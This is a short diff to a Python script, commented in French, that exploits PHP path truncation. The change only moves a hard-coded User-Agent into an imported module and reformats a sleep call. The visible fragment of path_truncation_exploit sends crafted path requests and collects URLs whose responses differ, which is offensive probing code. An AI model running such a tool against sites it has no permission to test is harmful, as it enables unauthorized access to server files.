@@ -3,9 +3,7 @@ Script permettant d'exploiter une faille PHP path truncation
 """
 import requests
 import time
-
-headers = {
-    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"}
+from models.webRessource import headers_base as headers
 
 
 def path_truncation_exploit(url_base, filenameFile, prefix="a/../", injStr="/.", tempo=1):
@@ -24,7 +22,7 @@ def path_truncation_exploit(url_base, filenameFile, prefix="a/../", injStr="/.",
         r = requests.get(url_base + chemin, headers=headers).text
         if r != rt:
             list_result.append(url_base + chemin)
-        time.sleep(tempo/2)
+        time.sleep(tempo / 2)
     return list_result
 
 
